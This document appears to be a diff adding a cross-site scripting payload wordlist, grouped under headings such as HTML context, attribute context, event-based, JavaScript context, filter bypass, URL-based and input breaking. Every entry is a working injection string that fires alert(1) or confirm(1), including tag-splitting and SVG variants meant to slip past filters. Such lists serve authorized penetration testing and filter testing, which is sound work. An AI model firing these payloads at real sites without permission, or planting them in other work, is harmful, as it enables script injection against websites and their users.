@@ -1,0 +1,53 @@
+# =========================
+# BASIC DETECTION
+# =========================
+<script>alert(1)</script>
+
+# =========================
+# HTML CONTEXT
+# =========================
+<b>test</b>
+<script>alert(1)</script>
+<i>hello</i>
+
+# =========================
+# ATTRIBUTE CONTEXT
+# =========================
+" onmouseover=alert(1)
+' onfocus=alert(1) autofocus '
+" autofocus onfocus=alert(1)
+
+# =========================
+# EVENT BASED
+# =========================
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+
+# =========================
+# JAVASCRIPT CONTEXT
+# =========================
+"; alert(1); //
+'; alert(1); //
+";confirm(1);//
+
+# =========================
+# FILTER BYPASS
+# =========================
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<img src=x onerror=confirm(1)>
+<svg><script>alert(1)</script>
+<svg/onload=alert(1)>
+<<script>alert(1)//<</script>
+
+# =========================
+# URL / HREF BASED
+# =========================
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+
+# =========================
+# INPUT BREAKING
+# =========================
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
